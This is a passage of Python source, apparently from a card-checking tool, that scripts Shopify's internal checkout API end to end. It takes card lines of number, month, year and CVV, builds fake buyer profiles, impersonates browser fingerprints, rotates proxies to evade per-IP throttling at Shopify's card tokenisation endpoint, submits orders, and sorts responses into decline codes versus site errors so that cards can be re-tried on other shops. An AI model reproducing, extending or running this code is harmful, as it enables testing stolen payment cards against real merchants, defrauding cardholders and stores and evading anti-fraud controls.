          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null,
          "lineComponents": []
        }}
      ]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      {billing}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}}{email_block},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": [],
    "includeTaxStrategyLines": false
  }},
  "operationName": "Proposal",
  "id": {json.dumps(proposal_id)}
}}'''

def send_proposal(sess, shop_url, checkout_url, checkout_token, session_token,
                  stable_id, variant_id, price, proposal_id, build_id, source_token,
                  currency, country, queue_token=None, email=None, addr=None,
                  requires_shipping: bool = True):
    payload = _build_proposal(session_token, queue_token, stable_id, variant_id,
                              proposal_id, email=email, addr=addr,
                              requires_shipping=requires_shipping)
    payload = patch_payload(payload, currency, country)
    h = _ckh(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    r = sess.post(shop_url + "/checkouts/internal/graphql/persisted?operationName=Proposal",
                  content=payload, headers=h, timeout=30)
    return r.status_code, r.text

# ─── Step 9: PCI tokenisation ────────────────────────────────────────────────

def step9_pci(ident_sig, card_number, card_month, card_year, card_cvv,
              shop_domain, proxy_url=""):
    payload = json.dumps({
        "credit_card": {
            "number": card_number, "month": card_month, "year": card_year,
            "verification_value": card_cvv, "start_month": None, "start_year": None,
            "issue_number": "", "name": "james anderson"
        },
        "payment_session_scope": shop_domain
    })
    pci = curl_requests.Session(impersonate="chrome120")
    try:
        if proxy_url:
            pci.proxies = {"http": proxy_url, "https": proxy_url}
        r = pci.post("https://checkout.pci.shopifyinc.com/sessions", content=payload, headers={
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://checkout.pci.shopifyinc.com",
            "priority": "u=1, i",
            "referer": "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
            "sec-ch-ua": _SEC_CH_UA,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-fetch-storage-access": "active",
            "shopify-identification-signature": ident_sig,
            "user-agent": _UA,
        }, timeout=30)
    finally:
        pci.close()
    return r.status_code, r.text

# ─── Step 10: SubmitForCompletion ─────────────────────────────────────────────

def send_submit(sess, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, submit_id, build_id, source_token,
                queue_token, email, addr, delivery_handle, shipping_amount,
                total_amount, pci_session_id, attempt_token, currency, country,
                signed_handles, card_number, payment_method_id,
                payment_flex_terms_id="", seller_tax_amt="", seller_tax_included_amt="",
                requires_shipping: bool = True):

    card_bin     = card_number[:8]
    page_id      = generate_page_id()
    pft = ""
    if payment_flex_terms_id:
        pft = f''',
        "paymentFlexibilityTermsId": {json.dumps(payment_flex_terms_id)}'''

    if seller_tax_included_amt:
        taxes_block = f'''"taxes": {{
        "proposedAllocations": null,
        "proposedTotalAmount": null,
        "proposedTotalIncludedAmount": {{"value": {{"amount": {json.dumps(seller_tax_included_amt)}, "currencyCode": "USD"}}}},
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }}'''
    elif seller_tax_amt:
        taxes_block = f'''"taxes": {{
        "proposedAllocations": null,
        "proposedTotalAmount": {{"value": {{"amount": {json.dumps(seller_tax_amt)}, "currencyCode": "USD"}}}},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }}'''
    else:
        taxes_block = '''"taxes": {
        "proposedAllocations": null,
        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }'''

    if delivery_handle:
        strategy_block = f'''"selectedDeliveryStrategy": {{
          "deliveryStrategyByHandle": {{
            "handle": {json.dumps(delivery_handle)},
            "customDeliveryRate": false
          }},
          "options": {{}}
        }}'''
    else:
        strategy_block = f'''"selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }}'''

    if not requires_shipping:
        dest_val = "null"
        method_types = '["NONE"]'
        handles_json = "[]"
    else:
        dest_val = f'''{{"streetAddress": {{"address1": {json.dumps(addr["address1"])}, "address2": {json.dumps(addr["address2"])}, "city": {json.dumps(addr["city"])}, "countryCode": {json.dumps(addr["country_code"])}, "postalCode": {json.dumps(addr["postal_code"])}, "firstName": {json.dumps(addr["first_name"])}, "lastName": {json.dumps(addr["last_name"])}, "zoneCode": {json.dumps(addr["zone_code"])}, "phone": {json.dumps(addr["phone"])}, "oneTimeUse": false}}}}'''
        method_types = '["SHIPPING"]'
        handles_json = json.dumps([{"signedHandle": h} for h in signed_handles])

    payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": {json.dumps(session_token)}}},
      "queueToken": {json.dumps(queue_token)},
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      "delivery": {{
        "deliveryLines": [
          {{
            "destination": {dest_val},
            {strategy_block},
            "targetMerchandiseLines": {{"lines": [{{"stableId": {json.dumps(stable_id)}}}]}},
            "deliveryMethodTypes": {method_types},
            "expectedTotalPrice": {{"any": true}},
            "destinationChanged": false
          }}
        ],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {handles_json}}},
      "merchandise": {{
        "merchandiseLines": [
          {{
            "stableId": {json.dumps(stable_id)},
            "merchandise": {{
              "productVariantReference": {{
                "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
                "variantId": "gid://shopify/ProductVariant/{variant_id}",
                "properties": [],
                "sellingPlanId": null,
                "sellingPlanDigest": null
              }}
            }},
            "quantity": {{"items": {{"value": 1}}}},
            "expectedTotalPrice": {{"any": true}},
            "lineComponentsSource": null,
            "lineComponents": []
          }}
        ]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        "totalAmount": {{"any": true}},
        "paymentLines": [
          {{
            "paymentMethod": {{
              "directPaymentMethod": {{
                "paymentMethodIdentifier": {json.dumps(payment_method_id)},
                "sessionId": {json.dumps(pci_session_id)},
                "billingAddress": {{
                  "streetAddress": {{
                    "address1": {json.dumps(addr["address1"])},
                    "address2": {json.dumps(addr["address2"])},
                    "city": {json.dumps(addr["city"])},
                    "countryCode": {json.dumps(addr["country_code"])},
                    "postalCode": {json.dumps(addr["postal_code"])},
                    "firstName": {json.dumps(addr["first_name"])},
                    "lastName": {json.dumps(addr["last_name"])},
                    "zoneCode": {json.dumps(addr["zone_code"])},
                    "phone": {json.dumps(addr["phone"])}
                  }}
                }},
                "cardSource": null
              }},
              "giftCardPaymentMethod": null,
              "redeemablePaymentMethod": null,
              "walletPaymentMethod": null,
              "walletsPlatformPaymentMethod": null,
              "localPaymentMethod": null,
              "paymentOnDeliveryMethod": null,
              "paymentOnDeliveryMethod2": null,
              "manualPaymentMethod": null,
              "customPaymentMethod": null,
              "offsitePaymentMethod": null,
              "customOnsitePaymentMethod": null,
              "deferredPaymentMethod": null,
              "customerCreditCardPaymentMethod": null,
              "paypalBillingAgreementPaymentMethod": null,
              "remotePaymentInstrument": null
            }},
            "amount": {{"any": true}}
          }}
        ],
        "billingAddress": {{
          "streetAddress": {{
            "address1": {json.dumps(addr["address1"])},
            "address2": {json.dumps(addr["address2"])},
            "city": {json.dumps(addr["city"])},
            "countryCode": {json.dumps(addr["country_code"])},
            "postalCode": {json.dumps(addr["postal_code"])},
            "firstName": {json.dumps(addr["first_name"])},
            "lastName": {json.dumps(addr["last_name"])},
            "zoneCode": {json.dumps(addr["zone_code"])},
            "phone": {json.dumps(addr["phone"])}
          }}
        }},
        "creditCardBin": {json.dumps(card_bin)}{pft}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": {json.dumps(email)},
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [{{"email": {{"consentState": "DECLINED", "value": {json.dumps(email)}}}}}],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      {taxes_block},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": {json.dumps(attempt_token)},
    "metafields": [],
    "analytics": {{
      "requestUrl": {json.dumps(checkout_url)},
      "pageId": {json.dumps(page_id)}
    }},
    "includeTaxStrategyLines": false
  }},
  "operationName": "SubmitForCompletion",
  "id": {json.dumps(submit_id)}
}}'''

    payload = patch_payload(payload, currency, country)
    h = _ckh(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    r = sess.post(
        shop_url + "/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        content=payload, headers=h, timeout=30)
    return r.status_code, r.text

# ─── Step 11: PollForReceipt ──────────────────────────────────────────────────

def send_poll(sess, shop_url, checkout_url, checkout_token, session_token,
              build_id, source_token, poll_id, receipt_id, receipt_sess_token):
    vars_json = json.dumps({"receiptId": receipt_id, "sessionToken": receipt_sess_token})
    params    = urlencode({"operationName":"PollForReceipt","variables":vars_json,"id":poll_id})
    h = _ckh(shop_url, checkout_url, checkout_token, session_token, build_id, source_token,
             extra={"x-checkout-web-source-id": checkout_token})  # mirrors Go: uses checkoutToken
    r = sess.get(shop_url + "/checkouts/internal/graphql/persisted?" + params, headers=h, timeout=20)
    return r.status_code, r.text

# ══════════════════════════════ MAIN CHECKOUT FLOW ═══════════════════════════

class CurrencyNotSupportedError(Exception):
    pass

def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -> dict:
    currency, country = "USD", "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")
    email, addr = generate_profile(country)

    result = {
        "card": card_entry, "shop_url": shop_url, "site_name": site_name,
        "currency": currency, "amount": "", "gateway": "", "status": "error",
        "status_code": "", "error": None, "retryable": False,
    }

    # Parse card
    parts = card_entry.strip().split("|")
    if len(parts) != 4:
        result["error"] = "invalid card format"; return result
    card_number, card_month_s, card_year_s, card_cvv = parts
    try:
        card_month = int(card_month_s)
        card_year  = int(card_year_s)
    except ValueError:
        result["error"] = "invalid card month/year"; return result

    # Reject bad numbers up front so we never burn a site/proxy attempt on a
    # card that can never authorize.
    if not luhn_valid(card_number):
        result["status"] = "declined"; result["status_code"] = "INVALID_CARD_NUMBER"
        result["error"] = "luhn check failed"; return result
    if not (card_cvv.isdigit() and len(card_cvv) in (3, 4)):
        result["status"] = "declined"; result["status_code"] = "INVALID_CVV"
        result["error"] = "invalid cvv"; return result

    # ── Step 0: find variants ─────────────────────────────────────────────────
    # (currency comes from Storefront GraphQL / checkout HTML; no separate prefetch needed)
    # Retried on transport-level failures only: a fresh session per attempt (the
    # old one may hold a dead keep-alive to the failed proxy) and, when the caller
    # gave us a proxy, a different one from the pool.
    step0_err = None
    for attempt in range(1, STEP0_MAX_ATTEMPTS + 1):
        if attempt > 1:
            rotated = rotate_step0_proxy(proxy_url, country)
            if rotated:
                proxy_url = rotated
            delay = (STEP0_BACKOFF_S * (2 ** (attempt - 2))) + random.uniform(0, STEP0_BACKOFF_S / 3)
            log.info("[STEP0] retry %d/%d in %.2fs (proxy=%s): %s",
                     attempt, STEP0_MAX_ATTEMPTS, delay, "rotated" if rotated else "same", step0_err)
            time.sleep(delay)
            if _over():
                break

        sess     = make_session(proxy_url)      # curl_cffi — fingerprinted browser calls
        api_sess = make_api_session(proxy_url)  # plain requests — Storefront GraphQL + REST API
        try:
            variants = find_all_variants(sess, shop_url, api_sess=api_sess)
            step0_err = None
            break
        except Exception as e:
            step0_err = str(e)
            if attempt == STEP0_MAX_ATTEMPTS or _over() or not step0_retryable(step0_err):
                break

    if step0_err:
        result["error"] = f"Step 0 failed: {step0_err}"
        result["retryable"] = True; return result

    # Piggyback currency from Storefront GraphQL
    if currency == "USD" and variants and variants[0].get("currency"):
        cur = variants[0]["currency"]
        if len(cur) == 3:
            currency = cur
            country = CURRENCY_TO_COUNTRY.get(cur, "US")
            result["currency"] = currency

    # ── Step 1: add to cart + checkout ───────────────────────────────────────
    checkout_url = checkout_token = session_token = checkout_html = ""
    variant_id = price = ""
    cart_ok = False
    requires_shipping = variants[0].get("requires_shipping", True) if variants else True
    for i, v in enumerate(variants[:5]):
        variant_id = v["variant_id"]
        price      = v["price_str"]
        requires_shipping = v.get("requires_shipping", True)
        try:
            checkout_url, checkout_token, session_token, checkout_html = \
                step1_add_to_cart(sess, shop_url, variant_id)
            cart_ok = True; break
        except Exception as e:
            es = str(e).lower()
            if any(x in es for x in ("422","inventory","unavailable","out of stock","sold out")):
                continue
            result["error"] = f"Step 1 failed: {e}"
            result["retryable"] = True; return result

    if not cart_ok:
        result["error"] = "Step 1 failed: all variant attempts exhausted"
        result["retryable"] = True; return result

    if is_cloudflare(checkout_html):
        result["error"] = "Step 1 failed: Cloudflare challenge"
        result["retryable"] = True; return result

    stable_id  = ext_stable_id(checkout_html)
    build_id   = ext_commit_sha(checkout_html)
    source_tok = ext_source_token(checkout_html)

    if not all((stable_id, build_id, source_tok)):
        # Check for store not accepting orders (403 or specific store notice)
        if ("isn’t set up to receive orders yet" in checkout_html or
            "isn't set up to receive orders yet" in checkout_html or
            "status-code-403" in checkout_html or
            "This store isn" in checkout_html):
            result["status"] = "error"
            result["status_code"] = "STORE_NOT_ACCEPTING_ORDERS"
            result["error"] = "STORE_NOT_ACCEPTING_ORDERS"
            result["retryable"] = True; return result

        # New Shopify auth-gated checkout: /checkout redirects to
        # shopify.com/authentication/.../oauth/authorize and the public checkout
        # page never loads, so no bundles exist to parse. Retrying cannot help.
        if ("/authentication/" in checkout_url or "oauth/authorize" in checkout_url or
            "/customer_authentication/" in checkout_url or "/account/" in checkout_url):
            result["status"] = "error"
            result["status_code"] = "AUTH_GATED_CHECKOUT"
            result["error"] = "AUTH_GATED_CHECKOUT"
            result["retryable"] = True; return result
        result["error"] = "Step 1 failed: missing stableId/buildId/sourceToken"
        result["retryable"] = True; return result

    if (hc := ext_currency_from_html(checkout_html)) and hc != "USD":
        currency = hc; result["currency"] = currency
        country = CURRENCY_TO_COUNTRY.get(hc, country)

    # ── Step 2: PAT ───────────────────────────────────────────────────────────
    pat_id = ext_pat_id(checkout_html)
    if not pat_id:
        result["error"] = "Step 2 failed: no PAT id"
        result["retryable"] = True; return result
    try:
        step2_fetch_pat(sess, shop_url, checkout_url, pat_id)
    except Exception as e:
        result["error"] = f"Step 2 failed: {e}"
        result["retryable"] = True; return result

    # ── Step 3: actions JS ────────────────────────────────────────────────────
    # The legacy bundle is tried first (one request when Shopify still ships it);
    # if it is gone or no longer carries the ids, fall back to scanning the
    # bundles the checkout page references.
    js_body = ""
    actions_url = ext_actions_js_url(checkout_html, shop_url)
    if actions_url:
        try:
            js_body = step3_fetch_actions_js(sess, actions_url, shop_url)
        except Exception:
            js_body = ""
    proposal_id = ext_proposal_id(js_body) if js_body else ""
    submit_id = ext_submit_id(js_body) if js_body else ""
    if not (proposal_id and submit_id):
        try:
            js_body = step3_locate_action_ids(shop_url, checkout_html, build_id)
        except Exception as e:
            result["error"] = f"Step 3 failed: {e}"
            result["retryable"] = True; return result
        proposal_id = ext_proposal_id(js_body)
        submit_id = ext_submit_id(js_body)
    if not proposal_id or not submit_id:
        result["error"] = "Step 3 failed: missing Proposal or Submit ID"
        result["retryable"] = True; return result

    poll_id = POLL_FOR_RECEIPT_ID   # static; same on all stores

    # ── Step 4: Proposal 1 ────────────────────────────────────────────────────
    try:
        st4, body4 = send_proposal(sess, shop_url, checkout_url, checkout_token, session_token,
                                   stable_id, variant_id, price, proposal_id, build_id, source_tok,
                                   currency, country, requires_shipping=requires_shipping)
    except Exception as e:
        result["error"] = f"Step 4 failed: {e}"; result["retryable"] = True; return result
    if st4 >= 400:
        result["error"] = f"Step 4 failed: proposal HTTP {st4}"; result["retryable"] = True; return result

    if has_currency_not_supported(body4):
        raise CurrencyNotSupportedError(shop_url)

    requires_shipping = ext_is_shipping_required(body4, default=requires_shipping)

    if (sc := ext_seller_currency(body4)):
        currency = sc
        country = CURRENCY_TO_COUNTRY.get(sc, country)
    if (ct := ext_seller_country(body4)):  country  = ct
    result["currency"] = currency
    addr = address_for_country(country, first_name=addr["first_name"], last_name=addr["last_name"])

    if currency == "USD":
        if (sp := ext_seller_merch_price(body4)):
            price = sp

    queue1 = ext_queue_token(body4)
    if not queue1:
        result["error"] = "Step 4 failed: no queueToken"; return result

    payment_method_id = ext_payment_method_id(body4)

    # ── Step 5: Proposal 2 (with email) ──────────────────────────────────────
    try:
        st5, body5 = send_proposal(sess, shop_url, checkout_url, checkout_token, session_token,
                                   stable_id, variant_id, price, proposal_id, build_id, source_tok,
                                   currency, country, queue_token=queue1, email=email,
                                   requires_shipping=requires_shipping)
    except Exception as e:
        result["error"] = f"Step 5 failed: {e}"; result["retryable"] = True; return result
    if st5 >= 400:
        result["error"] = f"Step 5 failed: proposal HTTP {st5}"; result["retryable"] = True; return result

    if has_currency_not_supported(body5):
        raise CurrencyNotSupportedError(shop_url)

    queue2 = ext_queue_token(body5)
    if not queue2:
        result["error"] = "Step 5 failed: no queueToken"; return result

    # ── Step 6: Proposal 3 (with address) ────────────────────────────────────
    time.sleep(random.uniform(0.05, 0.12))
    try:
        st6, body6 = send_proposal(sess, shop_url, checkout_url, checkout_token, session_token,
                                   stable_id, variant_id, price, proposal_id, build_id, source_tok,
                                   currency, country, queue_token=queue2, email=email, addr=addr,
                                   requires_shipping=requires_shipping)
    except Exception as e:
        result["error"] = f"Step 6 failed: {e}"; result["retryable"] = True; return result
    if st6 >= 400:
        result["error"] = f"Step 6 failed: proposal HTTP {st6}"; result["retryable"] = True; return result

    if has_currency_not_supported(body6):
        raise CurrencyNotSupportedError(shop_url)

    queue3 = ext_queue_token(body6)
    if not queue3:
        result["error"] = "Step 6 failed: no queueToken"; return result

    # ── Step 7: Proposal 4 ────────────────────────────────────────────────────
    time.sleep(random.uniform(0.05, 0.12))
    try:
        st7, body7 = send_proposal(sess, shop_url, checkout_url, checkout_token, session_token,
                                   stable_id, variant_id, price, proposal_id, build_id, source_tok,
                                   currency, country, queue_token=queue3, email=email, addr=addr,
                                   requires_shipping=requires_shipping)
    except Exception as e:
        result["error"] = f"Step 7 failed: {e}"; result["retryable"] = True; return result
    if st7 >= 400:
        result["error"] = f"Step 7 failed: proposal HTTP {st7}"; result["retryable"] = True; return result

    if has_currency_not_supported(body7):
        raise CurrencyNotSupportedError(shop_url)

    queue4 = ext_queue_token(body7)
    if not queue4:
        result["error"] = "Step 7 failed: no queueToken"; return result

    # ── Step 8: Proposal 5 ────────────────────────────────────────────────────
    time.sleep(random.uniform(0.05, 0.12))
    try:
        st8, body8 = send_proposal(sess, shop_url, checkout_url, checkout_token, session_token,
                                   stable_id, variant_id, price, proposal_id, build_id, source_tok,
                                   currency, country, queue_token=queue4, email=email, addr=addr,
                                   requires_shipping=requires_shipping)
    except Exception as e:
        result["error"] = f"Step 8 failed: {e}"; result["retryable"] = True; return result
    if st8 >= 400:
        result["error"] = f"Step 8 failed: proposal HTTP {st8}"; result["retryable"] = True; return result

    if has_currency_not_supported(body8):
        raise CurrencyNotSupportedError(shop_url)

    requires_shipping = ext_is_shipping_required(body8, default=requires_shipping)
    result["gateway"] = extract_gateway(body4, body8)

    # ── Step 9: PCI card tokenisation ────────────────────────────────────────
    ident_sig = ext_ident_sig(checkout_html)
    if not ident_sig:
        result["error"] = "Step 9 failed: no identification signature"
        result["retryable"] = True; return result
    pci_session_id = ""
    pci_try_err = ""
    pci_proxy = proxy_url
    for __pci_attempt in range(4):
        if _over():
            result["error"] = "Step 9 failed: deadline exceeded"
            result["retryable"] = True; return result
        if __pci_attempt > 0 and proxy_url:
            # PCI throttles per exit IP (403/429). Rotate the egress on retry;
            # direct callers (proxy_url=="") keep their intended direct routing.
            try:
                fresh = whop_pick_proxy(country)
                if fresh and fresh != pci_proxy:
                    pci_proxy = fresh
            except Exception:
                pass
        try:
            __pci_status, pci_body = step9_pci(
                ident_sig, card_number, card_month, card_year,
                card_cvv, site_name, pci_proxy)
            pci_session_id = ext_pci_session_id(pci_body)
            if pci_session_id:
                break
            pci_try_err = "no PCI session ID in body (%dB)" % len(pci_body)
            if __pci_status >= 400:
                pci_try_err = "PCI HTTP %d" % __pci_status
            if pci_body.strip():
                log.warning("[PCI] attempt %d %s: %s", __pci_attempt + 1,
                            pci_try_err, pci_body[:120])
        except Exception as e:
            pci_try_err = str(e)
            log.warning("[PCI] attempt %d error: %s", __pci_attempt + 1, pci_try_err)
        if __pci_attempt < 3:
            # 403/429 (IP throttling) get a longer cool-down before retry.
            extra = 2.5 if ("429" in pci_try_err or "403" in pci_try_err) else 0
            time.sleep(min(3.5, 0.75 * (2 ** __pci_attempt)) + extra)
    if not pci_session_id:
        result["error"] = f"Step 9 failed: {pci_try_err}"
        result["retryable"] = True; return result

    # ── Step 10: SubmitForCompletion ──────────────────────────────────────────
    queue5 = ext_queue_token(body8)
    if not queue5:
        result["error"] = "Step 10 failed: no queueToken"; return result

    delivery_handle = ext_delivery_handle(body8)

    signed_handles = ext_signed_handles(body8)

    shipping_amount = ext_shipping_amount(body8)
    total_amount    = ext_checkout_total(body8)
    if not total_amount:
        total_amount = ext_running_total(body8)
    if not total_amount:
        result["error"] = "Step 10 failed: no total amount"; return result
    result["amount"] = (total_amount if _amt_positive(total_amount)
                        else (price or ext_seller_merch_price(body8) or total_amount))
    pay_flex_terms_id = ext_payment_flex_terms_id(body8)
    seller_tax_amt = ext_seller_tax_amt(body8)
    seller_tax_incl = ext_seller_tax_included_amt(body8)

    recovery_left = 3
    while True:
        attempt_token = generate_attempt_token(checkout_token)
        try:
            sub_status, submit_body = send_submit(
                sess, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, submit_id, build_id, source_tok,
                queue5, email, addr, delivery_handle, shipping_amount, total_amount,
                pci_session_id, attempt_token, currency, country,
                signed_handles, card_number, payment_method_id,
                pay_flex_terms_id, seller_tax_amt, seller_tax_incl,
                requires_shipping=requires_shipping
            )
        except Exception as e:
            result["error"] = f"Step 10 failed: {e}"; result["retryable"] = True; return result

        if sub_status >= 400:
            result["error"] = f"Step 10 failed: submit HTTP {sub_status}"
            result["retryable"] = True; return result

        # ── Step 10b: accept seller's new tax proposal and re-submit ───────────
        if ("TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body or "TAX_TAX_INCLUSIVITY_MISMATCH" in submit_body) and not ext_receipt_id(submit_body):
            if (st_amt := ext_seller_tax_amt(submit_body)):
                seller_tax_amt = st_amt
            if (st_incl := ext_seller_tax_included_amt(submit_body)):
                seller_tax_incl = st_incl
            if seller_tax_amt or seller_tax_incl:
                attempt_token = generate_attempt_token(checkout_token)
                try:
                    sub_status, submit_body = send_submit(
                        sess, shop_url, checkout_url, checkout_token, session_token,
                        stable_id, variant_id, price, submit_id, build_id, source_tok,
                        queue5, email, addr, delivery_handle, shipping_amount, total_amount,
                        pci_session_id, attempt_token, currency, country,
                        signed_handles, card_number, payment_method_id,
                        pay_flex_terms_id, seller_tax_amt, seller_tax_incl,
                        requires_shipping=requires_shipping
                    )
                except Exception as e:
                    result["error"] = f"Step 10b failed: {e}"; result["retryable"] = True; return result
                if sub_status >= 400:
                    result["error"] = f"Step 10b failed: submit HTTP {sub_status}"
                    result["retryable"] = True; return result

        if ext_receipt_id(submit_body) or not recovery_left:
            break
        if _over():
            break
        # Delivery/presentment plan drift → the rails recompute the accepted
        # plan while rejecting, so the corrected handle/totals are already
        # embedded in this response. One fresh Proposal
        # re-syncs queue/delivery/totals, then we resubmit instead of failing the site.
        if not _RECOVERABLE_VIOLATION_RE.search(submit_body):
            break
        _plan = _plan_from_submit(submit_body)
        if _plan is None:
            _plan = {}
        if _plan.get("requires_shipping") is not None:
            requires_shipping = _plan["requires_shipping"]
        elif "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in submit_body:
            requires_shipping = False
        if _plan.get("tax_amt"):
            seller_tax_amt = _plan["tax_amt"]
        if _plan.get("tax_incl"):
            seller_tax_incl = _plan["tax_incl"]
        _q  = _plan.get("queue") or queue5
        _dh = _plan.get("handle") or delivery_handle
        _sa = _plan.get("shipping") or shipping_amount
        _ta = _plan.get("total") or total_amount
        _sh = _plan.get("signed") or signed_handles
        _pf = _plan.get("flex") or pay_flex_terms_id
        _pmi = _plan.get("pmethod") or payment_method_id
        _ctr = _plan.get("country")
        if _plan.get("currency"):
            currency = _plan["currency"]
            result["currency"] = currency
        if currency and CURRENCY_TO_COUNTRY.get(currency):
            country = CURRENCY_TO_COUNTRY[currency]
        elif _ctr:
            country = CURRENCY_TO_COUNTRY.get(_ctr, _ctr)
        addr = address_for_country(country)

        # If delivery details changed or delivery handle could not be resolved from submit_body,
        # run a fresh Proposal to re-sync queueToken, delivery strategies, signed handles, and totals.
        if not _dh or "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in submit_body or "DELIVERY_" in submit_body:
            try:
                st_prop, body_prop = send_proposal(
                    sess, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, proposal_id, build_id, source_tok,
                    currency, country, queue_token=_q, email=email, addr=addr,
                    requires_shipping=requires_shipping
                )
                if st_prop < 400 and not has_currency_not_supported(body_prop):
                    requires_shipping = ext_is_shipping_required(body_prop, default=requires_shipping)
                    _q = ext_queue_token(body_prop) or _q
                    _dh = ext_embedded_handle(body_prop) or ext_delivery_handle(body_prop) or _dh
                    _sh = ext_signed_handles(body_prop) or _sh
                    _sa = ext_shipping_amount(body_prop) or _sa
                    _ta = ext_checkout_total(body_prop) or ext_running_total(body_prop) or _ta
                    if (sp_cur := ext_seller_currency(body_prop)):
                        currency = sp_cur
                        country = CURRENCY_TO_COUNTRY.get(sp_cur, country)
                    if (sp_ctr := ext_seller_country(body_prop)): country = sp_ctr
            except Exception as e:
                log.warning("[STEP10] recovery proposal failed: %s", e)

        if not _amt_positive(_sa):
            _sa = shipping_amount
        if not _amt_positive(_ta):
            _ta = total_amount
        queue5, delivery_handle = _q, _dh
        shipping_amount, total_amount = _sa, _ta
        signed_handles, pay_flex_terms_id = _sh, _pf
        payment_method_id = _pmi
        addr = address_for_country(country)
        result["amount"] = (total_amount if _amt_positive(total_amount)
                            else result["amount"])

        if "WAITING_PENDING_TERMS" in submit_body:
            time.sleep(1.2)
        recovery_left -= 1

    # ── Parse submit response ──────────────────────────────────────────────────
    receipt_id = ext_receipt_id(submit_body)
    if not receipt_id:
        _DECLINE_MAP = {
            "CARD_DECLINED":"CARD_DECLINED","INSUFFICIENT_FUNDS":"INSUFFICIENT_FUNDS",
            "EXPIRED_CARD":"EXPIRED_CARD","INCORRECT_NUMBER":"INCORRECT_NUMBER",
            "INVALID_CVC":"INCORRECT_CVC","INCORRECT_CVC":"INCORRECT_CVC",
            "CARD_VELOCITY_EXCEEDED":"CARD_VELOCITY_EXCEEDED",
            "FRAUD_SUSPECTED":"FRAUD_SUSPECTED","PROCESSING_ERROR":"PROCESSING_ERROR",
            "DECISION_RULE_BLOCK":"DECISION_RULE_BLOCK",
        }
        for m in _PROP_ERROR_RE.finditer(submit_body):
            code, msg = m.group(1), m.group(2)
            if code.startswith("DELIVERY_") or code == "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH":
                log.warning("[STEP10] reject code=%s msg=%s", code, (msg or "")[:160])
            if code == "VALIDATION_CUSTOM":
                # Site validation rejects the order BEFORE card auth → config issue,
                # not a card decision. Retry with a fresh site.
                result["status"] = "error"; result["status_code"] = code
                result["error"] = code; result["retryable"] = True; return result
            if code == "WAITING_PENDING_TERMS":
                # Checkout is waiting on an async completion (rate recalc,
                # deferred terms) — a site state, not a card decision, and not
                # fixable by re-running the same checkout.
                result["status"] = "error"; result["status_code"] = code
                result["error"] = code; result["retryable"] = True; return result
            # Site/order-level config issues, delivery failures, and tax mismatches are NOT card decisions → retry with a fresh site.
            if code in _SITE_CONFIG_CODES or code.startswith("DELIVERY_") or code.startswith("TAX_"):
                result["status"] = "error"; result["status_code"] = code
                result["error"] = code; result["retryable"] = True; return result
            sc = _DECLINE_MAP.get(code, code)
            if "CAPTCHA" in str(sc).upper():
                sc = "CAPTCHA_REQUIRED"
            result["status"] = "declined"; result["status_code"] = sc
            result["error"] = f"declined: {sc}"
            # Transient gateway decline → give it another attempt, still a decline.
            result["retryable"] = sc in _RETRY_DECLINE_CODES or code in _RETRY_DECLINE_CODES
            return result
